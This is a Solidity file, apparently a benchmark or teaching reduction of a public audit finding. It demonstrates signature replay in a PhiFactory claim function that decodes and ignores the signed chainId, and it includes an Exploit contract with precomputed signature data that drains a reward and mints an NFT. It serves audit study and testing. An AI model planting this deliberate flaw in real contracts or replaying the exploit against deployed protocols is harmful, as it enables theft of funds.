// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi — Signature replay in signatureClaim ignores chainId
    (Code4rena 2024-08-phi, finding #41087, H-01, reporter McToady)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    PhiFactory.signatureClaim(signature_, encodeData_, mintArgs_) decodes
    encodeData_ as (expiresIn_, minter_, ref_, verifier_, artId_, <chainId>, data_)
    -- the chainId slot is decoded and immediately DISCARDED, never compared to
    block.chainid. The correct path (PhiNFT1155 -> Claimable.signatureClaim)
    re-packs encodeData_ substituting the real block.chainid before forwarding,
    but PhiFactory.signatureClaim is a PUBLIC function that can be called
    directly, bypassing that substitution entirely. A signature signed for
    chain id 999 (while block.chainid is 1) is therefore honored here too.
//////////////////////////////////////////////////////////////////////////*/

contract MockRewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockArt1155 {
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    function mint(address to, uint256 id, uint256 amount) external {
        balanceOf[to][id] += amount;
    }
}

/// @notice Reduced PhiFactory -- faithful reduction of src/PhiFactory.sol#L327-L346.
contract PhiFactory {
    address public immutable phiSignerAddress;
    MockArt1155 public immutable art;
    MockRewardToken public immutable rewardToken;
    uint256 public constant VERIFY_REWARD = 100; // protocol-funded bounty paid to `verifier_`
    mapping(uint256 => bool) public claimed;

    constructor(address signer_, MockArt1155 art_, MockRewardToken rewardToken_) {
        phiSignerAddress = signer_;
        art = art_;
        rewardToken = rewardToken_;
    }

    function _recoverSigner(bytes32 hash_, bytes memory signature_) internal pure returns (address) {
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash_));
        require(signature_.length == 65, "bad sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature_, 32))
            s := mload(add(signature_, 64))
            v := byte(0, mload(add(signature_, 96)))
        }
        return ecrecover(ethSigned, v, r, s);
    }

    /// @dev Faithful reduction of PhiFactory.signatureClaim (src/PhiFactory.sol#L327-L346).
    function signatureClaim(
        bytes calldata signature_,
        bytes calldata encodeData_,
        uint256 tokenId_,
        uint256 quantity_
    )
        external
    {
        (uint256 expiresIn_, address minter_, address ref_, address verifier_, uint256 artId_,, bytes32 data_) =
            abi.decode(encodeData_, (uint256, address, address, address, uint256, uint256, bytes32));
        // @> VULN: the decoded chainId (6th tuple slot, between artId_ and data_) is thrown
        // away -- never checked against block.chainid.
        // FIX: require(chainId_ == block.chainid, "wrong chain");

        if (expiresIn_ <= block.timestamp) revert("SignatureExpired");
        if (_recoverSigner(keccak256(encodeData_), signature_) != phiSignerAddress) revert("AddressNotSigned");
        require(!claimed[artId_], "already claimed");
        claimed[artId_] = true;

        art.mint(minter_, tokenId_, quantity_);
        rewardToken.transfer(verifier_, VERIFY_REWARD);
        ref_;
        data_;
    }
}

contract Exploit {
    MockArt1155 public art; // CREATE nonce 1
    MockRewardToken public rewardToken; // CREATE nonce 2
    PhiFactory public factory; // CREATE nonce 3

    address public constant PARTICIPANT = address(0xBEEF);
    address public constant VERIFIER = address(0xCAFE);
    uint256 constant TOKEN_ID = 1;

    // Precomputed OFFLINE (private key 0xA11CE, signer 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    // -- no cheatcodes in this file. encodeData_ = abi.encode(
    //   expiresIn=2_000_000_000, minter=0xBEEF, ref=address(0), verifier=0xCAFE,
    //   artId=1, chainId=999 (FOREIGN -- NOT this synthetic's chain id 1), data="claimdata")
    bytes constant ENCODE_DATA =
        hex"0000000000000000000000000000000000000000000000000000000077359400000000000000000000000000000000000000000000000000000000000000beef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000003e7636c61696d646174610000000000000000000000000000000000000000000000";
    bytes32 constant R = 0x5dc47c3d4e8588fb0d2c9b04c636843940802458cdab84423324b4097dadb150;
    bytes32 constant S = 0x1e3968f204b71dfc3b19af73280d7aee51cade490d643665d267a39649fff746;
    uint8 constant V = 27;
    address constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;

    constructor() {
        art = new MockArt1155();
        rewardToken = new MockRewardToken();
        factory = new PhiFactory(SIGNER, art, rewardToken);
        rewardToken.mint(address(factory), 1000); // protocol reward pool
    }

    function run() external {
        require(block.chainid != 999, "setup: block.chainid must differ from the signed chainId");

        uint256 verifierBefore = rewardToken.balanceOf(VERIFIER);

        bytes memory sig = abi.encodePacked(R, S, V);
        // === attack: claim using a signature bound to a FOREIGN chain (999) ===
        factory.signatureClaim(sig, ENCODE_DATA, TOKEN_ID, 1);

        // HARM: the claim succeeded despite the signature never authorizing THIS chain --
        // the participant received the art NFT and the protocol reward pool paid the verifier.
        require(art.balanceOf(PARTICIPANT, TOKEN_ID) == 1, "participant did not receive art");
        require(rewardToken.balanceOf(VERIFIER) == verifierBefore + factory.VERIFY_REWARD(), "reward not paid");
    }
}
